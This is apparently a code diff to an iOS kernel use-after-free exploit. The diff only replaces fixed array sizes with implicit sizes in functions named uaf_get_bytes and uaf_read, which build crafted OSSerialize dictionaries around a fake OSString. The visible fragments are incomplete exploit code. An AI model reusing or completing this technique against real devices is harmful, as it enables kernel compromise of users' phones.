@@ -21,13 +21,13 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
     PRINT_BUF("Data", data, sizeof(OSString));
 
     uint32_t buflen = (uint32_t)len;
-    const char str[4] = "str",
-               ref[4] = "ref",
-               sav[4] = "sav";
+    const char str[] = "str",
+               ref[] = "ref",
+               sav[] = "sav";
 
     if(get_os_version() >= V_13C75) // 9.2
     {
-        uint32_t dict_92[11 + sizeof(OSString) / sizeof(uint32_t)] =
+        uint32_t dict_92[] =
         {
             kOSSerializeMagic,                                              // Magic
             kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
@@ -68,7 +68,7 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
     }
     else
     {
-        uint32_t dict_90[16 + sizeof(OSString) / sizeof(uint32_t)] =
+        uint32_t dict_90[] =
         {
             kOSSerializeMagic,                                              // Magic
             kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
@@ -176,7 +176,7 @@ void uaf_read(const char *addr, char *buf, size_t len)
 
     static vtab_t vtab = NULL; // Initial value
     static uint32_t
-    dict_92[DICT_HEAD + ENT_LEN_92] =
+    dict_92[] =
     {
         /* dict head */
 
@@ -226,7 +226,7 @@ void uaf_read(const char *addr, char *buf, size_t len)
         'Z',
         kOSSerializeEndCollection | kOSSerializeObject | 10,
     },
-    dict_90[DICT_HEAD + ENT_LEN_90] =
+    dict_90[] =
     {
         /* dict head */
 
